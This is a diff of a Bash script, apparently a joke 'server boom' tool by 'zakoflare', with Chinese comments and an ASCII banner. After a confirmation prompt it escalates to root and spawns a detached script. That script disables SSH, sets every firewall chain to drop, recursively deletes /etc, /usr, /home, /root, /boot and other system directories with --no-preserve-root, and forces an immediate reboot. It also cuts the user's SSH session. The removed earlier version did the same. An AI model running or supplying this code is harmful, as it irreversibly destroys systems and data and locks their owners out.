@@ -1,51 +1,79 @@
-set -e
 RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
 
+# 强制从终端读取   
+echo -e "${GREEN}          _____                    _____                    _____           ${NC}"
+echo -e "${GREEN}         /\    \                  /\    \                  /\    \          ${NC}"
+echo -e "${GREEN}        /::\    \                /::\    \                /::\    \         ${NC}"
+echo -e "${GREEN}       /::::\    \              /::::\    \              /::::\    \        ${NC}"
+echo -e "${GREEN}      /::::::\    \            /::::::\    \            /::::::\    \       ${NC}"
+echo -e "${GREEN}     /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \      ${NC}"
+echo -e "${GREEN}    /:::/__\:::\    \        /:::/__\:::\    \        /:::/__\:::\    \     ${NC}"
+echo -e "${GREEN}    \:::\   \:::\    \       \:::\   \:::\    \      /::::\   \:::\    \    ${NC}"
+echo -e "${GREEN}  ___\:::\   \:::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   ${NC}"
+echo -e "${GREEN} /\   \:::\   \:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\ ___\  ${NC}"
+echo -e "${GREEN}/::\   \:::\   \:::\____\/::\   \:::\   \:::\____\/:::/__\:::\   \:::|    | ${NC}"
+echo -e "${GREEN}\:::\   \:::\   \::/    /\:::\   \:::\   \::/    /\:::\   \:::\  /:::|____| ${NC}"
+echo -e "${GREEN} \:::\   \:::\   \/____/  \:::\   \:::\   \/____/  \:::\   \:::\/:::/    /  ${NC}"
+echo -e "${GREEN}  \:::\   \:::\    \       \:::\   \:::\    \       \:::\   \::::::/    /   ${NC}"
+echo -e "${GREEN}   \:::\   \:::\____\       \:::\   \:::\____\       \:::\   \::::/    /    ${NC}"
+echo -e "${GREEN}    \:::\  /:::/    /        \:::\  /:::/    /        \:::\  /:::/    /     ${NC}"
+echo -e "${GREEN}     \:::\/:::/    /          \:::\/:::/    /          \:::\/:::/    /      ${NC}"
+echo -e "${GREEN}      \::::::/    /            \::::::/    /            \::::::/    /       ${NC}"
+echo -e "${GREEN}       \::::/    /              \::::/    /              \::::/    /        ${NC}"
+echo -e "${GREEN}       \::/    /                \::/    /                \::/____/          ${NC}"
+echo -e "${GREEN}         \/____/                  \/____/                  ~~               By zakoflare${NC}"
+echo -e "${GREEN}                                                                            SSB v4${NC}"
 echo -e "${RED}============================================================================================================${NC}"
-echo -e "${RED}               您正在运行「zakoflare 笑传之Server Server Boom」20260513A1RE-TEST ${NC}"
+echo -e "${RED}               您正在运行「zakoflare 笑传之Server Server Boom」20260513A4LTS ${NC}"
 echo -e "${RED}============================================================================================================${NC}"
-read -p "输入 y 确认: " confirm < /dev/tty
+read -p "请输入 'y' 确认或y以外的任意字母键取消: " confirm < /dev/tty
 if [ "$confirm" != "y" ]; then
-    echo "取消。"
+    echo "已取消"
     exit 0
 fi
 
 # 提权
 if [ "$EUID" -ne 0 ]; then
     sudo -v || { echo "sudo 失败"; exit 1; }
-    exec sudo bash "$0" "$@"
+    exec sudo bash "$0"
 fi
 
-nuke() {
-    # 防火墙直接阻断一切
-    iptables -F; iptables -X
-    iptables -P INPUT DROP; iptables -P FORWARD DROP; iptables -P OUTPUT DROP
+# 破坏代码写入独立脚本
+NUKER="/tmp/.self-destruct-$(date +%s).sh"
+cat > "$NUKER" <<'EOF'
+#!/bin/bash
+exec &>/dev/null
 
-    # 关闭 SSH 服务并禁用
-    systemctl stop sshd 2>/dev/null; systemctl disable sshd 2>/dev/null
-    systemctl stop ssh 2>/dev/null; systemctl disable ssh 2>/dev/null
+# 关闭SSH
+systemctl stop sshd 2>/dev/null || systemctl stop ssh 2>/dev/null
+systemctl disable sshd 2>/dev/null || systemctl disable ssh 2>/dev/null
 
-    # 并行删除一切常见目录
-    (rm -rf --no-preserve-root /opt /www /srv /home /root /etc /var /usr /bin /lib /boot /tmp/* &)
+# 防火墙DROP
+iptables -F 2>/dev/null; iptables -X 2>/dev/null
+iptables -P INPUT DROP 2>/dev/null
+iptables -P FORWARD DROP 2>/dev/null
+iptables -P OUTPUT DROP 2>/dev/null
 
-    # 摧毁包管理系统
-    rm -rf /var/lib/dpkg /var/lib/apt /var/cache/apt /usr/bin/dpkg /usr/bin/apt* &
+# 并行删除所有关键目录
+for dir in /opt /www /srv /home /root /etc /var /usr /bin /lib /boot; do
+    [ -d "$dir" ] && rm -rf --no-preserve-root "$dir" &
+done
+wait
 
-    # 杀掉所有用户进程
-    ps -eo pid --no-headers | grep -v "$$" | xargs -r kill -9 2>/dev/null
+# 触发立即重启
+echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
+echo b > /proc/sysrq-trigger 2>/dev/null
+reboot -f 2>/dev/null
+EOF
 
-    # 强制关机
-    echo 1 > /proc/sys/kernel/sysrq
-    echo b > /proc/sysrq-trigger 2>/dev/null || /sbin/shutdown -h now &
-}
+chmod +x "$NUKER"
 
-# 脱离终端
-nohup bash -c "$(declare -f nuke); nuke" >/dev/null 2>&1 &
+# 脱离会话
+nohup "$NUKER" >/dev/null 2>&1 < /dev/null &
 disown
 
-# 切断SSH连接
-iptables -A OUTPUT -p tcp --sport 22 -j REJECT --reject-with tcp-reset
-
+# 掐断SSH
+iptables -A OUTPUT -p tcp --sport 22 -j REJECT --reject-with tcp-reset 2>/dev/null
 kill -9 $(ps -o ppid= -p $$) 2>/dev/null
 
 exit 0
